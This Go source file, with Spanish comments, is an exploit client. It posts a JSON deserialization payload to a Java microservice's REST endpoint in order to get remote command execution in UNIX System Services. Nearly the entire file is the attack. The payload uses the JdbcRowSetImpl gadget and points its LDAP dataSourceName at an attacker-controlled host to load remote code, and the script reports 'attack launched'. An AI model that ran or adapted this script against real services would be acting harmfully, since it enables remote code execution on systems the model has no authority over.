// Explicación: Cliente HTTP en Go diseñado para inyectar payloads de deserialización JSON en microservicios Java vulnerables.
// Objetivo: Explotar la falta de sanitización de tipos en el endpoint REST (ej. vulnerabilidades tipo Jackson/Fastjson) enviando una estructura que fuerza la ejecución remota de comandos en el USS (UNIX System Services).
package main

import (
	"bytes"
	"fmt"
	"net/http"
	"time"
)

func main() {
	targetURL := "http://localhost:8080/api/v1/uss/query"

	maliciousJSON := []byte(`{
		"@type": "com.sun.rowset.JdbcRowSetImpl",
		"dataSourceName": "ldap://attacker-controlled-server.com/ExecuteCommand",
		"autoCommit": true
	}`)

	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer(maliciousJSON))
	if err != nil {
		fmt.Println("Error estructurando el request:", err)
		return
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer MOCK_TOKEN_INJECT_HERE")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Timeout o conexion rehusada. El target puede estar caido:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Ataque lanzado. Status HTTP de respuesta: %s\n", resp.Status)
}